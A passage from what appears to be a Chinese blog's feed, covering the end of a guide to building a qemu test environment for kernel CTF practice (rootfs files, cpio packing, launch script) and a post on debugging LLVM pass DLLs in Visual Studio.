class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/sh</span><br><span class="line">ctf:x:1000:1000:ctf:/home/ctf:/bin/sh</span><br></pre></td></tr></table></figure><p><code>etc/group</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:*:0:</span><br><span class="line">ctf:*:1000:</span><br></pre></td></tr></table></figure><p>之后可以用一个命令打包这个文件系统 <code>find . | cpio -o --format=newc &gt; ../rootfs.img</code>。</p><p>如果要重新解包文件系统可以使用这个命令 <code>cpio -idmv &lt; rootfs.img</code>。</p><h3 id="qemu启动"><a href="#qemu启动" class="headerlink" title="qemu启动"></a>qemu启动</h3><p>然后把 bzImage 和 rootfs.img 放一起，新建一个启动脚本，输入以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot; \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure><p>就可以启动 qemu 了。</p><img src="/2024/02/01/Linux_Kernel_Pwn1/4.png" class=""><p>OK，配置环境到这里也就差不多了。</p>]]></content>
    
    
    <summary type="html">准备开始搞 kernel pwn 了。</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="pwn" scheme="https://xia0ji233.github.io/categories/ctf/pwn/"/>
    
    <category term="kernel" scheme="https://xia0ji233.github.io/categories/ctf/pwn/kernel/"/>
    
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLVM——Pass模块的调试</title>
    <link href="https://xia0ji233.github.io/2024/01/23/LLVM4/"/>
    <id>https://xia0ji233.github.io/2024/01/23/LLVM4/</id>
    <published>2024-01-23T13:00:00.000Z</published>
    <updated>2024-04-09T05:23:09.874Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下动调dll项目的过程</p><span id="more"></span><h2 id="调试DLL的问题"><a href="#调试DLL的问题" class="headerlink" title="调试DLL的问题"></a>调试DLL的问题</h2><p>正常试过一遍用 clang 作为启动项目或者是用 dll 作为启动项目，但是都不能成功断下来，这里我说一下我所使用的方法。</p><p>首先在项目属性中开启调试符号</p><p>项目-&gt;属性-&gt;配置属性-&gt;链接器-&gt;调试-&gt;生成调试信息选择为<strong>生成调试信息（&#x2F;DEBUG）</strong></p><img src="/2024/01/23/LLVM4/1.png" class=""><p>然后把项目-&gt;属性-&gt;配置属性-&gt;C&#x2F;C++ -&gt;常规 -&gt;调试信息格式 ，设置为<strong>程序数据库（&#x2F;ZI）</strong></p><img src="/2024/01/23/LLVM4/2.png" class=""><p>打开这两个选项之后，可以发现，我们如果设置好调试参数直接启动的话，断点还是不会命中，并且会提示：</p><img src="/2024/01/23/LLVM4/3.png" class=""><p>因为 clang 的子进程才会加载模块，如果直接开启调试会一直检测该进程没有加载该模块，所以会出现这个错误。</p><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><h3 id="一般解决方案"><a href="#一般解决方案" class="headerlink" title="一般解决方案"></a>一般解决方案</h3><p>最容易解决的办法，直接附加子进程即可解决，我选择在 run 方法中休眠十秒，然后在下面下断点，新开个 cmd 执行编译命令，然后趁着休眠的时候附加到子进程。</p><img src="/2024/01/23/LLVM4/4.png" class=""><p>这里可以提前搜索 clang.exe</p><img src="/2024/01/23/LLVM4/5.png" class=""><p>最下面的那个进程是我们运行的命令，而上面这个就是创建的子进程，所以我们选择附加上面这个进程。</p><img src="/2024/01/23/LLVM4/6.png" class=""><p>然后我们就可以发现 dll 在vs中断下来了，接下来就可以开开心心地用 VS 去调试 dll 了。</p><h3 id="更好的解决方案"><a href="#更好的解决方案" class="headerlink" title="更好的解决方案"></a>更好的解决方案</h3><p>当然，在网上冲浪的时候，也是发现了一个插件，在管理扩展中搜 child 就可以直接下载。</p><img src="/2024/01/23/LLVM4/7.png" class=""><p>安装完成了之后可以在调试-&gt;调试其它目标的选项中看到该插件的管理</p><img src="/2024/01/23/LLVM4/8.png" class=""><p>勾选 enable child process debugging即可。</p><p>这样配置好参数之后，直接启动就能马上断下来，算是一个更好的解决方案吧。</p><img src="/2024/01/23/LLVM4/9.png" class="">]]></content>
    
    
    <summary type="html">顺便记录一下动调dll项目的过程</summary>
    
    
    
    <category term="Compiler" scheme="https://xia0ji233.github.io/categories/Compiler/"/>
    
    <category term="LLVM" scheme="https://xia0ji233.github.io/categories/Compiler/LLVM/"/>
    
    
    <category term="LLVM" scheme="https://xia0ji233.github.io/tags/LLVM/"/>
    
  </entry>
  
</feed>
